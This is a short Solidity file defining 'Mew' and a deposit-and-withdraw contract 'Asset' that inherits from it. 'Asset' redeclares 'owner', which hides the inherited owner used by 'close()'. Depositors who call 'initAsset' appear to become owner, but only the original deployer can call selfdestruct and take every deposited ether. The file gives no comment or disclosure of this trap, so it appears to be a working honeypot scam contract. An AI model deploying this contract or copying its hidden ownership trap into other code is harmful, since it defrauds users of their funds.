1 pragma solidity ^0.4.25;
2 
3 contract Mew {
4     address owner = msg.sender;
5     function change(address a) public { if(owner==msg.sender) owner=a; }
6     function close() public { if(owner==msg.sender) selfdestruct(msg.sender); }
7 }
8 
9 contract Asset is Mew
10 {
11     address public owner;
12     mapping ( address => uint256 ) public assetIn;
13     uint256 public minDeposit;
14     function() external payable { }
15     function initAsset(uint256 min) public payable {
16         if (min > minDeposit && msg.value >= min) {
17             owner = msg.sender;
18             minDeposit = min;
19             deposit();
20         } else revert();
21     }
22     function deposit() public payable {
23         if (msg.value >= minDeposit) {
24             assetIn[msg.sender] += msg.value;
25         }
26     }
27     function withdraw(uint256 amount) public {
28         uint256 max = assetIn[msg.sender];
29         if (max > 0 && amount <= max) {
30             assetIn[msg.sender] -= amount;
31             msg.sender.transfer(amount);
32         }
33     }
34 }